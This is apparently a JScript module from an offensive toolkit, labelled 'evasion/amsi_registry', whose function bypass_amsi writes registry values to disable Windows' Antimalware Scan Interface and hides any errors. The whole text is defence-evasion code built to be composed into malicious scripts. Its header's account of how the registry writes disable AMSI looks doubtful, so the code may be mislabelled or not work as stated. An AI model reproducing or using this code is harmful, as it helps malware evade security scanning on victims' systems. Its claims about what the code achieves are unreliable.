// chunk: evasion/amsi_registry
// depends: (none)
// provides: bypass_amsi
// format: jscript
// note: Disables AMSI via registry by setting WSH Enabled=0 under
//       HKCU\Software\Microsoft\Windows Script Host\Settings.

function bypass_amsi() {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var key = "HKCU\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled";
        sh.RegWrite(key, 0, "REG_DWORD");
    } catch(e) {}
    /* Also try to disable AMSI provider registration */
    try {
        var sh2 = new ActiveXObject("WScript.Shell");
        var amsiKey = "HKCU\\Software\\Microsoft\\AMSI\\Providers";
        sh2.RegWrite(amsiKey + "\\", "", "REG_SZ");
    } catch(e) {}
}
